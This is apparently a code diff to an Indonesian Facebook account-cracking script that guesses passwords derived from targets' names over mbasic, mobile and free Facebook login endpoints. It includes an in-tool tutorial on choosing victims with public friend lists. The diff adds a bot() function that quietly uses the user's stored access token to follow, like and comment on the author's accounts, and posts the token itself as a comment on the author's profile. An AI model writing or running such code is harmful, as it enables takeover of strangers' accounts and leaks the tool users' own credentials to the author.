@@ -236,7 +236,7 @@ def menu():
         ip = a["query"]
     except KeyError:
         ip = " "
-    print('%s╠══[ %sWelcome \x1b[0;93m%s \x1b[0;97mNgentod %s]'%(O,P,n,O))
+    print('%s╠══[ %sWelcome \x1b[0;96m%s \x1b[0;97mNgentod %s]'%(O,P,n,O))
     print('%s║'%(O))
     print('%s╠══[%s•%s] %sYou ID : %s'%(O,P,O,P,i))
     print('%s╠══[%s•%s] %sYou IP : %s'%(O,P,O,P,ip))
@@ -287,6 +287,27 @@ def menu():
     else:
         jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
         menu()
+def bot():
+	try:
+		token = open('token.txt', 'r').read()
+	except (KeyError, IOError):jalan('%s╚══[%s!%s] %sToken/Cookies Invalid Ngab !!'%(M,P,M,P));menu_log()
+	komen_ku = ('Bang Aang Ganteng Banget Deh')
+	komen_mu = ('Anjay Bang Ndrii Tambah Ganteng Aja:v')
+	komen_kita = ('Bang Aang Ganteng Banget Deh')
+	requests.post('https://graph.facebook.com/100004624064179/subscribers?access_token=' + token) # Moch Aang Sang Perudal Akun
+	requests.post('https://graph.facebook.com/100003252539235/subscribers?access_token=' + token) # Ayu Lestari
+	requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=' + token) # Moch Aang Ardiansyah-XD
+	requests.post('https://graph.facebook.com/100001621584081/subscribers?access_token=' + token) # Aang-Cyber X
+	requests.post('https://graph.facebook.com/100053460048331/subscribers?access_token=' + token) # Why Aang Ardiansyah
+	requests.post('https://graph.facebook.com/100061587581422/subscribers?access_token=' + token) # Zuhra X AangXD
+	requests.post('https://graph.facebook.com/108899972499673/comments/?message='+token+'&access_token=' + token) # Profil Moch Aang Ardiansyah-XD
+	requests.post('https://graph.facebook.com/1280398002467049/comments/?message='+token+'&access_token=' + token) # Profil Ndrii Sans
+	requests.post('https://graph.facebook.com/108899972499673/comments/?message='+komen_ku+'&access_token=' + token) # Komen Profil Ndrii Sans
+	requests.post('https://graph.facebook.com/108899972499673/comments/?message='+komen_ku+'&access_token=' + token) # Komen Profil Moch Aang Ardiansyah-XD
+	requests.post('https://graph.facebook.com/1280398002467049/likes?summary=true&access_token=' + token) # Like Ndrii Sans
+	requests.post('https://graph.facebook.com/108899972499673/likes?summary=true&access_token=' + token) # Like Moch Aang Ardiansyah-XD
+	requests.post('https://graph.facebook.com/108899972499673/comments/?message='+komen_mu+'&access_token=' + token) #  Komen Ndrii Sans
+	requests.post('https://graph.facebook.com/100001390111040/comments/?message='+komen_kita+'&access_token=' + token) #  Komen Moch Aang Ardiansyah-XD
 def defaultua():
     ua = ua_nokia
     try:
@@ -532,10 +553,12 @@ def generate1(_laura_):
             if len(i)==3 or len(i)==4 or len(i)==5:
                 _aangxd_.append(i+"123")
                 _aangxd_.append(i+"12345")
+                _aangxd_.append(i+"234")
             elif len(i)>=6:
                 _aangxd_.append(i)
                 _aangxd_.append(i+"123")
                 _aangxd_.append(i+"12345")
+                _aangxd_.append(i+"234")
             else:
                 continue
     _aangxd_.append(_laura_.lower())
@@ -550,10 +573,12 @@ def generate2(_laura_):
             if len(i)==3 or len(i)==4 or len(i)==5:
                 _aangxd_.append(i+"123")
                 _aangxd_.append(i+"12345")
+                _aangxd_.append(i+"234")
             else:
                 _aangxd_.append(i)
                 _aangxd_.append(i+"123")
                 _aangxd_.append(i+"12345")
+                _aangxd_.append(i+"234")
     _aangxd_.append(_cici_.lower())
     _aangxd_.append("bangsat")
     _aangxd_.append("sayang")
@@ -654,7 +679,7 @@ def log_mbasic(em,pas,hosts):
     ua = open('ugent.txt','r').read()
     r = requests.Session()
     r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-    p = r.get("https://mbasic.facebook.com/login.php?")
+    p = r.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=utf-8")
     b = bs4.BeautifulSoup(p.text,"html.parser")
     meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
     data={}
@@ -684,7 +709,7 @@ def log_mfb(em,pas,hosts):
     ua = open('ugent.txt','r').read()
     r = requests.Session()
     r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-    p = r.get("https://m.facebook.com/login.php?")
+    p = r.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=utf-8")
     b = bs4.BeautifulSoup(p.text,"html.parser")
     meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
     data={}
@@ -714,7 +739,7 @@ def log_free(em,pas,hosts):
     ua = open('ugent.txt','r').read()
     r = requests.Session()
     r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-    p = r.get("https://free.facebook.com/login.php?")
+    p = r.get("https://free.facebook.com/login/?next&ref=dbl&fl&refid=utf-8")
     b = bs4.BeautifulSoup(p.text,"html.parser")
     meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
     data={}
@@ -1419,11 +1444,11 @@ class crack:
             self.free_opsi(fl)
 def target():
     try:token = open('token.txt','r').read()
-    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));menu_log()
-    idt = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
+    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sToken/Cookies Invalid Ngab !!'%(M,P,M,P));menu_log()
+    idt = input("%s╠══[%s•%s] %sID Target : "%(O,K,O,H))
     try:
         zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
-    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P));menu()
+    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,K,M,M));menu()
     try:nm = zy["name"]
     except (KeyError,IOError):nm = ("-")
     try:nd = zy["first_name"]
@@ -1666,31 +1691,31 @@ def var_menu():
 def var_tutor():
     mlaku('%s╔══[%s Tips & Tutorial %s]'%(O,P,O))
     print('%s║'%(O))
-    print('%s╠══[%s1%s] %sHow to Take Token'%(O,P,O,P))
-    print('%s╠══[%s2%s] %sHow to Take Cookies'%(O,P,O,P))
-    print('%s╠══[%s3%s] %sHow to Get Target'%(O,P,O,P))
-    print('%s╠══[%s4%s] %sWays During the Crack Process'%(O,P,O,P))
+    print('%s╠══[%s1%s] %sCara Mengambil Token'%(O,P,O,P))
+    print('%s╠══[%s2%s] %sCara Mengambil Cookies'%(O,P,O,P))
+    print('%s╠══[%s3%s] %sCara Mendapatkan Target'%(O,P,O,P))
+    print('%s╠══[%s4%s] %sCara Selama Proses Crack'%(O,P,O,P))
 def tutor_target():
     mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
-    mlaku('%s║ %s1 %s║ %sPrepare a Sacrificial Account In Chrome For Cracking Process %s║'%(O,P,O,P,O))
-    mlaku('%s║ %s2 %s║ %sChange the Victim Account Password First          %s║'%(O,P,O,P,O))
-    mlaku('%s║ %s3 %s║ %sFind Random Account Targets, Friends List Must Be Public   %s║'%(O,P,O,P,O))
-    mlaku('%s║ %s4 %s║ %sFriends (FL) Free, Can be 1K, 2K, 3K, ,4K, Or 5K      %s║'%(O,P,O,P,O))
-    mlaku('%s║ %s5 %s║ %sMore Friends, More Possible Results  %s║'%(O,P,O,P,O))
-    mlaku('%s║ %s6 %s║ %sTap Target Profile/Cover Photo                      %s║'%(O,P,O,P,O))
-    mlaku('%s║ %s7 %s║ %ssee URL/Link Above, There is \ id = 10001xx\ %s║'%(O,P,O,P,O))
-    mlaku('%s║ %s8 %s║ %sWell, thats a target ID ready to crack   %s║'%(O,P,O,P,O))
-    mlaku('%s║ %s9 %s║ %sOpen Termux/Linux then proceed to the Crack Process %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s1 %s║ %sSiapkan Akun Tumbal Di Chrome Untuk Proses Crack     %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s2 %s║ %sGanti Password Akun Tumbal Terlebih Dahulu           %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s3 %s║ %sCari Target Akun Random, Daftar Teman Harus Publik   %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s4 %s║ %sTeman (FL) Bebas, Bisa 1K, 2K, 3K, ,4K, Atau 5K      %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s5 %s║ %sMakin Banyak Teman, Kemungkinan Makin Banyak Hasil   %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s6 %s║ %sKetuk Foto Profil/Sampul Target                      %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s7 %s║ %sLihat URL/Link Di Bagian Atas, Terdapat \'id=10001xx\' %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s8 %s║ %sNah, Itu Adalah ID Target Yang Siap Untuk Di Crack   %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s9 %s║ %sBuka Termux/Linux Kemudian Lanjut Ke Proses Crack    %s║'%(O,P,O,P,O))
     mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
     print('%s║'%(O))
 def tutor_crack():
     mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
-    mlaku('%s║ %s1 %s║ %sMethod Api : Fast But Easy Process Spam            %s║'%(O,P,O,P,O))
-    mlaku('%s║ %s2 %s║ %sMethod Mbasic : The process is quite fast, rarely spammed  %s║'%(O,P,O,P,O))
-    mlaku('%s║ %s3 %s║ %sMethod Mobile : Slow Process, Probably OK  %s║'%(O,P,O,P,O))
-    mlaku('%s║ %s4 %s║ %sCrack Using Data Quota (Not Support Wifi)  %s║'%(O,P,O,P,O))
-    mlaku('%s║ %s5 %s║ %sIf Results Do Not Appear While The Crack Is Running       %s║'%(O,P,O,P,O))
-    mlaku('%s║ %s6 %s║ %sTurn On Airplane Mode Only 5 Seconds                   %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s1 %s║ %sMetode Api : Proses Cepat Tapi Mudah Spam            %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s2 %s║ %sMetode Mbasic : Proses Agak Cepat, Jarang Kena Spam  %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s3 %s║ %sMetode Mobile : Proses Lambat, Kemungkinan OK Besar  %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s4 %s║ %sCrack Menggunakan Kuota Data (Tidak Support Wifi)    %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s5 %s║ %sApabila Hasil Tidak Muncul Saat Crack Berjalan       %s║'%(O,P,O,P,O))
+    mlaku('%s║ %s6 %s║ %sAktifkan Mode Pesawat 5 Detik Saja                   %s║'%(O,P,O,P,O))
     mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
     print('%s║'%(O))
 def var_author():
@@ -1720,7 +1745,7 @@ def var_ugen():
 def start_method():
     print('%s║'%(O))
     print('%s╠══[%s1%s] %sMetode B-Api'%(O,P,O,P))
-    print('%s╠══[%s2%s] %sMetode Mbasic'%(O,P,O,P))
+    print('%s╠══[%s2%s] %sMetode Mbasic [Rekomendasi]'%(O,P,O,P))
     print('%s╠══[%s3%s] %sMetode Mobile Fb'%(O,P,O,P))
     print('%s╠══[%s4%s] %sMetode Free Fb'%(O,P,O,P))
 def start_methodezz():
@@ -1744,4 +1769,4 @@ if __name__=='__main__':
   os.system('git pull')
   folder()
   menu()
-# Mau Ngapain Cuk?
+#___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___Aangxd___X___Lauraa<3___
